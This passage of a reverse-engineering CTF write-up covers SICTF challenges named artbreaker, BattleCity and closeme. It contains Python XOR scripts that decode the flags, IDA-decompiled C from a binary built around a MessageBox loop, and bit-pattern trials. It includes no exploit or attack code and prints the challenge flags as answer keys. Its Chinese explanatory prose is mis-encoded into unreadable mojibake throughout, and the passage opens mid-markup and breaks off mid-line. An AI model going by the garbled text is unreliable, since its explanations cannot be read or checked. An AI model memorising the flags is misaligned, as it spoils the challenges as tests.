class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">a = [<span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x07</span>, <span class="number">0x01</span>, <span class="number">0x1D</span>, <span class="number">0x3F</span>, <span class="number">0x09</span>, <span class="number">0x13</span>, </span><br><span class="line">     <span class="number">0x39</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x39</span>, <span class="number">0x2F</span>, <span class="number">0x39</span>, <span class="number">0x21</span>, </span><br><span class="line">     <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x41</span>, <span class="number">0x15</span>, <span class="number">0x39</span>, <span class="number">0x25</span>, <span class="number">0x14</span>, <span class="number">0x03</span>, </span><br><span class="line">     <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x0F</span>, <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x47</span>, <span class="number">0x22</span>, <span class="number">0x09</span>, </span><br><span class="line">     <span class="number">0x08</span>, <span class="number">0x41</span>, <span class="number">0x12</span>, <span class="number">0x39</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x39</span>, <span class="number">0x15</span>, </span><br><span class="line">     <span class="number">0x03</span>, <span class="number">0x14</span>, <span class="number">0x0F</span>, <span class="number">0x09</span>, <span class="number">0x13</span>, <span class="number">0x15</span>, <span class="number">0x47</span>, <span class="number">0x1B</span>]</span><br><span class="line"></span><br><span class="line">pxor(a,<span class="number">0x66</span>)</span><br><span class="line"><span class="comment">#flag&#123;You_and_I_God&#x27;s_Creation!Don&#x27;t_be_serious!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="artbreaker">artbreaker</h3><p>idaæ‰“å¼€åå‘ç°ä¸èƒ½åç¼–è¯‘ä¹Ÿä¸èƒ½çœ‹æµç¨‹ï¼Œä¿®æ”¹æœ€å¤§èŠ‚ç‚¹æ•°é‡ç„¶åè·³åˆ°æµç¨‹å›¾</p><p>ç»“æœ</p><p><img src="https://s2.loli.net/2024/02/23/zvDxTWEJqRoksOM.png" alt="image-20240223164916217"></p><p>å±…ç„¶ç”¨æµç¨‹å›¾æŠŠflagç”»å‡ºæ¥äº†,çœ‹æœªå®šä¹‰å˜é‡çš„wpï¼Œè¯´æ˜¯ç”¨äº†**<a href="https://github.com/JuliaPoo/Artfuscator">Artfuscator</a>**è¿™ä¸ªæ¥ç”»çš„ç”»</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;Rabbit_falls_into_rabbit_hole&#125;</span></span><br></pre></td></tr></table></figure><h3 id="BattleCity">BattleCity</h3><p>æ¸¸æˆé¢˜ï¼Œçœ‹æ ·å­æ˜¯è¦é€šå…³ï¼Œåœ¨assetsä¸­å¯ä»¥çœ‹åˆ°levels.ldtkæ–‡ä»¶ï¼Œç”¨æ–‡æœ¬æ–‡ä»¶ç¼–è¾‘å™¨æ‰“å¼€å¯ä»¥å‘ç°é‡Œé¢æœ‰å„ç§ä¸œè¥¿çš„å±æ€§ï¼Œäºæ˜¯æˆ‘æŠŠæ¯ä¸€å…³çš„æ•Œäººåªç•™äº†ä¸€ä¸ªï¼Œç„¶åæŠŠåŸºåœ°çš„é•¿å®½æ”¹æˆ0ï¼Œæ‰“å®Œ4å…³ï¼Œassetsé‡Œå‡ºç°äº†win.pngï¼Œæ˜¯äºŒç»´ç ï¼Œæ‰«ç å°±å‡ºæ¥äº†</p><h3 id="closeme">closeme</h3><p>æç¤ºæ˜¯è¦ç”¨æ­£å¸¸æ–¹å¼ç»“æŸç¨‹åº</p><p>ç”±äºç¨‹åºä¸€ç›´å¼¹å‡ºçª—å£ï¼Œå› æ­¤éœ€è¦é€šè¿‡messageboxå‡½æ•°çš„äº¤å‰å¼•ç”¨æ‰¾åˆ°ä¸»å‡½æ•°ã€‚æˆ–è€…é€šè¿‡åŠ¨æ€è°ƒè¯•æ‰¾åˆ°ä½ç½®ã€‚</p><p>ç„¶ååŠ¨è°ƒåˆ†æä¸€ä¸‹ï¼Œå‘ç°æ˜¯ä¸€ä¸ªå¾ªç¯+ä¸€äº›ä¸œè¥¿ï¼Œè¦ç»“æŸçš„è¯åªèƒ½å…ˆbreakï¼Œåœ¨205è¡Œæœ‰å”¯ä¸€çš„breakã€‚åŒæ—¶åé¢æœ‰ä¸€ä¸ªgotoï¼Œè®©æ‰§è¡Œæµåˆå›åˆ°label_4äº†ï¼Œè¿™å°±</p><p>ï¼ˆçœ‹äº†wpï¼‰å‘ç°ä¸‹é¢æœ‰ä¸€ä¸ªxoråŠ å¯†çš„hintï¼Œè§£å¯†å¾—åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">a=[<span class="number">0x23</span>, <span class="number">0x11</span>, <span class="number">0x0D</span>, <span class="number">0x1B</span>, <span class="number">0x13</span>, <span class="number">0x4B</span>, <span class="number">0x18</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x0A</span>, <span class="number">0x50</span>, <span class="number">0x08</span>, <span class="number">0x1D</span>, <span class="number">0x06</span>, <span class="number">0x54</span>, <span class="number">0x16</span>, <span class="number">0x1A</span>, <span class="number">0x18</span>, <span class="number">0x0B</span>, <span class="number">0x1C</span>, <span class="number">0x5A</span>, <span class="number">0x0F</span>, <span class="number">0x14</span>, <span class="number">0x18</span>, <span class="number">0x5E</span>, <span class="number">0x12</span>, <span class="number">0xE5</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0xE3</span>, <span class="number">0xE0</span>, <span class="number">0xE4</span>, <span class="number">0xE8</span>, <span class="number">0xF0</span>, <span class="number">0xA9</span>, <span class="number">0xE8</span>, <span class="number">0xF2</span>, <span class="number">0xAC</span>, <span class="number">0xEE</span>, <span class="number">0xE2</span>, <span class="number">0xE6</span>, <span class="number">0xF3</span>, <span class="number">0xFA</span>, <span class="number">0xB2</span>, <span class="number">0xF3</span>, <span class="number">0xCD</span>, <span class="number">0xF0</span>, <span class="number">0xE5</span>, <span class="number">0xF7</span>, <span class="number">0xB8</span>, <span class="number">0xF6</span>, <span class="number">0xE8</span>, <span class="number">0xBB</span>, <span class="number">0xFC</span>, <span class="number">0xD3</span>, <span class="number">0xF1</span>, <span class="number">0xFF</span>, <span class="number">0x8C</span>, <span class="number">0x81</span>, <span class="number">0xCB</span>, <span class="number">0xD7</span>, <span class="number">0x84</span>, <span class="number">0xD2</span>, <span class="number">0xCF</span>, <span class="number">0xCB</span>, <span class="number">0xC4</span>, <span class="number">0x89</span>, <span class="number">0xC8</span>, <span class="number">0xCE</span>, <span class="number">0x8C</span>, <span class="number">0xDE</span>, <span class="number">0xDA</span>, <span class="number">0xC0</span>, <span class="number">0xC2</span>, <span class="number">0xD4</span>, <span class="number">0xD6</span>, <span class="number">0x9D</span>, <span class="number">0x94</span>, <span class="number">0xFF</span>, <span class="number">0xC3</span>, <span class="number">0xC4</span>, <span class="number">0xCC</span>, <span class="number">0x99</span>, <span class="number">0xD9</span>, <span class="number">0xD3</span>, <span class="number">0xD3</span>, <span class="number">0xD2</span>, <span class="number">0xCD</span>, <span class="number">0xDA</span>, <span class="number">0xE0</span>, <span class="number">0x98</span>, <span class="number">0xA7</span>, <span class="number">0xB0</span>, <span class="number">0xEB</span>, <span class="number">0x8B</span>, <span class="number">0xA9</span>, <span class="number">0xEF</span>, <span class="number">0xF9</span>, <span class="number">0xE6</span>, <span class="number">0xFA</span>, <span class="number">0xE2</span>, <span class="number">0xEC</span>, <span class="number">0xA4</span>, <span class="number">0xA0</span>, <span class="number">0xEF</span>, <span class="number">0xB1</span>, <span class="number">0xF1</span>, <span class="number">0xB1</span>, <span class="number">0xB6</span>, <span class="number">0xA6</span>, <span class="number">0xA1</span>, <span class="number">0xB7</span>, <span class="number">0xBE</span>, <span class="number">0xB6</span>, <span class="number">0xF9</span>, <span class="number">0xB5</span>, <span class="number">0xA9</span>, <span class="number">0xB8</span>, <span class="number">0xB8</span>, <span class="number">0xAC</span>, <span class="number">0xFF</span>, <span class="number">0x97</span>, <span class="number">0x89</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x8C</span>, <span class="number">0xC5</span>, <span class="number">0x8F</span>, <span class="number">0x94</span>, <span class="number">0xC8</span>, <span class="number">0x9D</span>, <span class="number">0x82</span>, <span class="number">0x8E</span>, <span class="number">0xCC</span>, <span class="number">0x8B</span>, <span class="number">0x82</span>, <span class="number">0x8E</span>, <span class="number">0x97</span>, <span class="number">0xDD</span>, <span class="number">0xD2</span>, <span class="number">0x80</span>, <span class="number">0x81</span>, <span class="number">0x96</span>, <span class="number">0x9E</span>, <span class="number">0xD7</span>, <span class="number">0x99</span>, <span class="number">0x8A</span>, <span class="number">0xDA</span>, <span class="number">0xCB</span>, <span class="number">0xCD</span>, <span class="number">0xCD</span>, <span class="number">0xCE</span>, <span class="number">0xCE</span>,<span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x2D</span>, <span class="number">0x24</span>, <span class="number">0x55</span>, <span class="number">0x6A</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x7A</span>, <span class="number">0x6F</span>, <span class="number">0x2B</span>, <span class="number">0x7F</span>, <span class="number">0x78</span>, <span class="number">0x6C</span>, <span class="number">0x62</span>, <span class="number">0x79</span>, <span class="number">0x65</span>, <span class="number">0x32</span>, <span class="number">0x75</span>, <span class="number">0x78</span>, <span class="number">0x74</span>, <span class="number">0x71</span>, <span class="number">0x37</span>, <span class="number">0x6F</span>, <span class="number">0x71</span>, <span class="number">0x73</span>, <span class="number">0x78</span>, <span class="number">0x74</span>, <span class="number">0x3D</span>, <span class="number">0x6A</span>, <span class="number">0x77</span>, <span class="number">0x45</span>, <span class="number">0x01</span>, <span class="number">0x44</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x53</span>, <span class="number">0x08</span>, <span class="number">0x45</span>, <span class="number">0x43</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x0D</span>, <span class="number">0x4E</span>, <span class="number">0x7C</span>, <span class="number">0x79</span>, <span class="number">0x72</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x4F</span>, <span class="number">0x05</span>, <span class="number">0x07</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x08</span>, <span class="number">0x0B</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x40</span>, <span class="number">0x5E</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    a[i] ^= i+<span class="number">102</span></span><br><span class="line">pl(a)</span><br><span class="line"><span class="comment">#Every time you close the messagebox by click `Yes` or `No`, it will be stored. Just choose Yes/No(1/0) in a certain order which is the flag, such as 01001100. Please submit flag which the format like `SICTF&#123;01001100&#125;`</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ ¹æ®ä¸Šé¢çš„breakï¼Œå¯ä»¥çœ‹å‡ºéœ€è¦è¾“å…¥16æ¬¡</p><p>ä½†æ˜¯è¦æ£€æµ‹åˆ°æŒ‰é”®æŒ‰çš„æ˜¯å“ªä¸ª</p><p>æ ¹æ®messageboxWï¼šyesæ˜¯6ï¼Œnoæ˜¯7ã€‚æŸ¥æ‰¾åå¯ä»¥å‘ç°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v2 == <span class="number">5</span> * (v2 / <span class="number">5</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v63 = (<span class="type">const</span> WCHAR *)&amp;unk_140022B10;</span><br><span class="line">        v64 = (__int64)&amp;unk_140022B3C;</span><br><span class="line">        LOWORD(Size) = <span class="number">0</span>;</span><br><span class="line">        LODWORD(v66) = <span class="number">1</span>;</span><br><span class="line">        sub_140003240(&amp;v70, &amp;v63);</span><br><span class="line">        lpWindowName = v71;</span><br><span class="line">        v63 = (<span class="type">const</span> WCHAR *)&amp;unk_140022B3C;</span><br><span class="line">        v64 = (__int64)&amp;unk_140022B5D;</span><br><span class="line">        LOWORD(Size) = <span class="number">0</span>;</span><br><span class="line">        LODWORD(v66) = <span class="number">1</span>;</span><br><span class="line">        sub_140003240(lpCaption, &amp;v63);</span><br><span class="line">        v73 = (<span class="type">unsigned</span> __int64)lpCaption[<span class="number">1</span>];</span><br><span class="line">        choose = MessageBoxW(<span class="number">0</span>i64, lpWindowName, lpCaption[<span class="number">1</span>], <span class="number">4u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( lpCaption[<span class="number">0</span>] )</span><br><span class="line">          sub_1400038E0(v73, <span class="number">2</span> * (__int64)lpCaption[<span class="number">0</span>], <span class="number">2</span>i64);</span><br><span class="line">        <span class="keyword">if</span> ( v70 )</span><br><span class="line">          sub_1400038E0(lpWindowName, <span class="number">2</span>i64 * (_QWORD)v70, <span class="number">2</span>i64);</span><br><span class="line">        this_choose_ans = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( choose != <span class="number">6</span> )                      <span class="comment">// å¦</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( choose != <span class="number">7</span> )                    <span class="comment">// å¦ï¼Œä¸å¯èƒ½è¿›å…¥</span></span><br><span class="line">          &#123;</span><br><span class="line">            v63 = (<span class="type">const</span> WCHAR *)&amp;off_140022B98;</span><br><span class="line">            v64 = <span class="number">1</span>i64;</span><br><span class="line">            Size = (<span class="type">size_t</span>)&amp;off_140022888;</span><br><span class="line">            v66 = <span class="number">0</span>i64;</span><br><span class="line">            sub_1400214A0(&amp;v63, &amp;off_140022BA8);</span><br><span class="line">          &#125;</span><br><span class="line">          this_choose_ans = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cont2 = cont;                           <span class="comment">// æ˜¯</span></span><br><span class="line">        <span class="keyword">if</span> ( cont == v59 )                      <span class="comment">// ?</span></span><br><span class="line">        &#123;</span><br><span class="line">          sub_140003820(&amp;v59);</span><br><span class="line">          cont2 = cont;</span><br><span class="line">        &#125;</span><br><span class="line">        *(_BYTE *)(save_place + cont2) = this_choose_ans;</span><br><span class="line">        <span class="keyword">if</span> ( ++cont == <span class="number">16</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ­£this_choose_ansçš„å€¼ï¼Œæ˜¯==1ï¼Œå¦==0,æœ€åå­˜åœ¨save_placeä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">sp0 = *(<span class="type">unsigned</span> __int8 *)save_place;</span><br><span class="line"><span class="keyword">if</span> ( sp0 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp1 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp1 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp2 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp2 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp3 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp3 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp4 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp4 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp5 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp5 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp6 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">6</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp6 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp7 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">7</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp7 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp8 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp8 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp9 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">9</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp9 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp10 = (LPCWSTR)*(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">10</span>);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)sp10 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp11 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">11</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp11 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp12 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">12</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp12 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp13 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">13</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp13 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp14 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">14</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp14 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp15 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">15</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp15 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">final = sp0</span><br><span class="line">      + <span class="number">10</span></span><br><span class="line">      * (sp1</span><br><span class="line">       + <span class="number">10</span></span><br><span class="line">       * (sp2</span><br><span class="line">        + <span class="number">10</span></span><br><span class="line">        * (sp3</span><br><span class="line">         + <span class="number">10</span></span><br><span class="line">         * (sp4</span><br><span class="line">          + <span class="number">10</span></span><br><span class="line">          * (sp5</span><br><span class="line">           + <span class="number">10</span></span><br><span class="line">           * (sp6</span><br><span class="line">            + <span class="number">10</span></span><br><span class="line">            * (sp7</span><br><span class="line">             + <span class="number">10</span></span><br><span class="line">             * (sp8</span><br><span class="line">              + <span class="number">10</span> * (sp9 + <span class="number">10</span>i64 * (_QWORD)&amp;sp10[<span class="number">50000</span> * sp15 + <span class="number">5000</span> * sp14 + <span class="number">500</span> * sp13 + <span class="number">50</span> * sp12 + <span class="number">5</span> * sp11])))))))));</span><br></pre></td></tr></table></figure><p>ç»è¿‡è¿™é‡Œålabel_4ä¼šåˆ°ç¬¬ä¸€ä¸ªwhileï¼ˆ1ï¼‰çš„ä½ç½®æœ€å,é‚£åªèƒ½ç»§ç»­åˆ†æfinalï¼Œå®ƒå‚¨å­˜äº†æ‰€æœ‰è¾“å…¥å†…å®¹è®¡ç®—åçš„æœ€ç»ˆå€¼ï¼Œç”±äºå…ˆè¾“å…¥sp0ï¼Œç„¶å1ã€‚ã€‚ã€‚è¯´æ˜é«˜ä½åè¾“å…¥ï¼Œä½ä½å…ˆè¾“å…¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_14001F580(&amp;final, &amp;zero) )</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”ç”±äºæç¤ºçš„æŒ‰ä¸€å®šæ–¹å¼ç‚¹å‡»ï¼Œè¯´æ˜è‚¯å®šæœ‰æ£€æµ‹çš„å­˜åœ¨</p><p>åœ¨label_3çš„ä½ç½®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (what &amp; <span class="number">0xFFFF0000</span>) != <span class="number">-1443823616</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_3:</span><br><span class="line">    cont = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>åªè¦ç­‰äºå°±å¯ä»¥å¾€åèµ°</p><p>åå¼‚æˆ–ä¸€ä¸‹whatçš„å€¼ç­‰äº1443758080/560E 0000</p><p>åŠ¨æ€è°ƒè¯•ï¼Œè¾“å…¥æµ‹è¯•ï¼Œå‘ç°sp0åˆ°15å°±æ˜¯æ”¾å…¥çš„å€¼1010101ï¼Œå”¯ä¸€å¥‡æ€ªçš„æ˜¯sp13å’Œsp11æ˜¯ç‰¹å®šçš„å€¼0x800å’Œ0x90000000</p><p><s>ç»§ç»­çœ‹whatçš„ç”Ÿæˆ</s>çœ‹ä¸å‡ºæ¥ï¼Œè¯•è¯•ä»£æ•°æ®</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1111 </span><span class="number">1111 </span><span class="number">0000 </span><span class="number">0000</span> <span class="string">ã€‹</span>           <span class="number">1111 </span><span class="number">1111 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000</span></span><br><span class="line"></span><br><span class="line"><span class="number">0000 </span><span class="number">1111 </span><span class="number">1111 </span><span class="number">1111</span> <span class="string">ã€‹</span> <span class="number">0011 </span><span class="number">1111 </span><span class="number">1111 </span><span class="number">1100 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000</span></span><br><span class="line"></span><br><span class="line"><span class="number">0000 </span><span class="number">0000 </span><span class="number">1111 </span><span class="number">1111</span> <span class="string">ã€‹</span> <span class="number">0011 </span><span class="number">1111 </span><span class="number">1100 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000</span></span><br><span class="line"></span><br><span class="line"><span class="number">1001 </span><span class="number">1001 </span><span class="number">1001 </span><span class="number">1001</span> <span class="string">ã€‹</span> <span class="number">0110 </span><span class="number">0110 </span><span class="number">0110 </span><span class="number">0110 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®ç¬¬ä¸€ç»„æ•°æ®æ„Ÿè§‰æ˜¯å€’åºæ’å…¥ï¼Œä¸Šé¢finalä¹Ÿæ˜¯å€’åºçš„ã€‚å€’åºä¸€ä¸‹</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000 </span><span class="number">0000 </span><span class="number">1111 </span><span class="number">1111</span> <span class="string">ã€‹</span>           <span class="number">1111 </span><span class="number">1111 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000</span></span><br><span class="line"></span><br><span class="line"><span class="number">1111 </span><span class="number">1111 </span><span class="number">1111 </span><span class="number">0000</span> <span class="string">ã€‹</span> <span class="number">0011 </span><span class="number">1111 </span><span class="number">1111 </span><span class="number">1100 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000</span></span><br><span class="line"></span><br><span class="line"><span class="number">1111 </span><span class="number">1111 </span><span class="number">0000 </span><span class="number">0000</span> <span class="string">ã€‹</span> <span class="number">0011 </span><span class="number">1111 </span><span class="number">1100 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000</span></span><br><span class="line"></span><br><span class="line"><span class="number">1001 </span><span class="number">1001 </span><span class="number">1001 </span><span class="number">1001</span> <span class="string">ã€‹</span> <span class="number">0110 </span><span class="number">0110 </span><span class="number">0110 </span><span class="number">0110 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000</span></span><br></pre></td></tr></table></figure><p>ç¬¬å››ä¸ªçœ‹å¾—å¾ˆæ˜æ˜¾å¦‚æœä¸çœ‹å4ä½æ˜¯æœ€åä¸¤ä¸ªå˜åˆ°äº†å‰é¢</p><p>è¯•ä¸€è¯•æœ€åçš„whatæ˜¯ä¸æ˜¯è¿™æ ·å˜çš„</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">560e0000</span>ï¼š</span><br><span class="line"><span class="number">0101011000001110</span></span><br><span class="line"><span class="number">0101100000111001</span></span><br><span class="line"><span class="symbol">0101 </span><span class="number">1000</span> <span class="number">0011</span> <span class="number">1001</span></span><br></pre></td></tr></table></figure><p>ä¸å¯¹ï¼Ÿé‡æ–°çœ‹äº†ä¸€éå‘ç°æ˜¯ä¸è¿ç®—ï¼Œä¸æ˜¯å¼‚æˆ–ï¼Œé‚£å°±æ˜¯è¯´æœ€åçš„A9F1å°±æ˜¯ç»“æœçš„æœ«å€¼</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1010 </span><span class="number">1001 </span><span class="number">1111 </span><span class="number">0001</span></span><br><span class="line"><span class="number">1010 </span><span class="number">0111 </span><span class="number">1100 </span><span class="number">0110</span></span><br><span class="line"><span class="number">0110 </span><span class="number">0011 </span><span class="number">1110 </span><span class="number">0101</span></span><br><span class="line"><span class="string">å¾—åˆ°</span></span><br><span class="line"><span 